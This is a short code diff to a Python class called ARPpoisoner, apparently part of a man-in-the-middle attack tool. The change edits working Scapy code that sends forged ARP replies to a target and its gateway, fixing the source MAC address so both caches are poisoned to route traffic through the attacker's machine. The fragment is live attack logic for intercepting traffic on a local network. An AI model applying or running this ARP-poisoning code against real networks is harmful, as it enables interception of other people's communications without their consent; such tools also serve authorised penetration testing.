@@ -215,7 +215,7 @@ class ARPpoisoner:
                             try:
                                 #log.debug("Poisoning {} <-> {}".format(targetip, self.gatewayip))
                                 self.s2.send(Ether(src=self.mymac, dst=targetmac)/ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op=arpmode))
-                                self.s2.send(Ether(src=targetmac, dst=self.gatewaymac)/ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
+                                self.s2.send(Ether(src=self.mymac, dst=self.gatewaymac)/ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
                             except Exception as e:
                                 if "Interrupted system call" not in e:
                                    log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
